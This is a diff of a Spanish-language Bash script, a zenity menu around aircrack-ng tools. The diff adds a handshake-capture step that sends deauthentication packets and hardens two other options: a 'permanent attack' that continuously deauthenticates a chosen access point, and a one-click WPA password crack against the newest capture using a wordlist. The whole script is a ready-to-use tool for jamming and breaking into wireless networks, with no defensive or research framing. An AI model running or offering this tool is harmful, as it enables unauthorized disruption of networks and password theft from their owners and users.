@@ -1,20 +1,21 @@
 #!/bin/bash
-# WiFi Expert Suite v7.0 - AUTOMATIC CRACK EDITION
+# WiFi Expert Suite v7.5 - AUTOMATIC & STABLE
 
 while true; do
     CHOICE=$(zenity --list --title="📡 WiFi Expert Suite ULTIMATE" \
-        --column="ID" --column="Acción" --width=600 --height=500 \
+        --column="ID" --column="Acción" --width=600 --height=550 \
         1 "⚡ Activar Modo Monitor (Check Kill)" \
-        2 "🌐 Desactivar Modo Monitor (Internet)" \
+        2 "🌐 Desactivar Modo Monitor" \
         3 "📡 Escaneo General" \
         4 "🔍 Rastreo Específico" \
-        5 "🔑 Capturar Handshake (Manual)" \
+        5 "🔑 Capturar Handshake" \
         6 "🔥 ATAQUE PERMANENTE (Bloqueo Total)" \
-        7 "🔓 DESCIFRADO AUTOMÁTICO (Un solo clic)" \
+        7 "🔓 DESCIFRADO AUTOMÁTICO (Un clic)" \
         8 "❌ Salir")
 
     case $CHOICE in
         1) 
+            # Limpiamos procesos que bloquean la antena
             pkexec airmon-ng check kill
             INT=$(zenity --entry --text="Interfaz (ej: wlan0):" --entry-text="wlan0")
             pkexec airmon-ng start $INT | zenity --text-info --width=400 --height=200
@@ -32,30 +33,46 @@ while true; do
             sudo iwconfig wlan0mon channel $CANAL
             gnome-terminal --title="RASTREO" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL wlan0mon; exec bash"
             ;;
+        5)
+            BSSID=$(zenity --entry --text="BSSID:")
+            CANAL=$(zenity --entry --text="Canal:")
+            FICHERO=$(zenity --entry --text="Nombre de captura:" --entry-text="captura_$(date +%H%M)")
+            sudo iwconfig wlan0mon channel $CANAL
+            gnome-terminal --title="CAPTURANDO" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL -w $FICHERO wlan0mon; exec bash" &
+            sleep 3
+            xterm -e "sudo aireplay-ng -0 15 -a $BSSID wlan0mon"
+            ;;
         6)
             BSSID=$(zenity --entry --text="BSSID a Bloquear:")
             CANAL=$(zenity --entry --text="Canal:")
             sudo iwconfig wlan0mon channel $CANAL
             sudo aireplay-ng -0 0 -a $BSSID wlan0mon > /dev/null 2>&1 &
             ATAQUE_PID=$!
-            ( while ps -p $ATAQUE_PID > /dev/null; do echo "100" ; echo "# ⚡ ATAQUE ACTIVO: $BSSID" ; sleep 2; done ) | zenity --progress --title="BLOQUEO" --auto-close
-            sudo kill $ATAQUE_PID 2>/dev/null
+            
+            # Barra de progreso para control visual
+            ( while ps -p $ATAQUE_PID > /dev/null; do echo "100" ; echo "# 🔥 BLOQUEANDO: $BSSID" ; sleep 2; done ) | zenity --progress --title="ATAQUE EN CURSO" --auto-close
+            
+            # Validación para evitar el error de proceso no encontrado
+            if [ -n "$ATAQUE_PID" ] && ps -p $ATAQUE_PID > /dev/null; then
+                sudo kill $ATAQUE_PID 2>/dev/null
+            fi
             ;;
         7)
-            # FUNCIÓN DE DESCIFRADO AUTOMÁTICO
-            # Busca el archivo .cap más reciente en la carpeta actual
-            RECENT_CAP=$(ls -t *.cap 2>/dev/null | head -n 1)
+            # --- FUNCIÓN AUTOMÁTICA ---
+            # Selecciona el archivo .cap más reciente en la carpeta actual
+            CAP_REC=$(ls -t *.cap 2>/dev/null | head -n 1)
             
-            if [ -z "$RECENT_CAP" ]; then
-                zenity --error --text="No se encontraron archivos .cap en esta carpeta. Primero usa la Opción 5."
+            if [ -z "$CAP_REC" ]; then
+                zenity --error --text="No se encontró ninguna captura (.cap). Primero realiza una captura (Opción 5)."
             else
-                # Busca automáticamente el wordlist.txt
+                # Busca wordlist.txt en la misma carpeta
                 if [ -f "wordlist.txt" ]; then
-                    gnome-terminal --title="DESCIFRANDO AUTOMÁTICAMENTE" -- sh -c "echo 'Usando captura: $RECENT_CAP'; aircrack-ng -w wordlist.txt $RECENT_CAP; echo 'Presiona Enter para cerrar'; read"
+                    notify-send "Crackeo Automático" "Procesando captura: $CAP_REC"
+                    gnome-terminal --title="AUTO-CRACKING" -- sh -c "aircrack-ng -w wordlist.txt $CAP_REC; echo 'Presiona Enter para finalizar'; read"
                 else
-                    zenity --warning --text="No encontré 'wordlist.txt'. Por favor selecciónalo manualmente."
-                    WORDLIST=$(zenity --file-selection --title="Selecciona Diccionario")
-                    gnome-terminal --title="DESCIFRANDO" -- sh -c "aircrack-ng -w $WORDLIST $RECENT_CAP; read"
+                    zenity --warning --text="No se encontró 'wordlist.txt'. Selecciónalo manualmente."
+                    DICC=$(zenity --file-selection --title="Selecciona Diccionario")
+                    gnome-terminal --title="DESCIFRANDO" -- sh -c "aircrack-ng -w $DICC $CAP_REC; read"
                 fi
             fi
             ;;
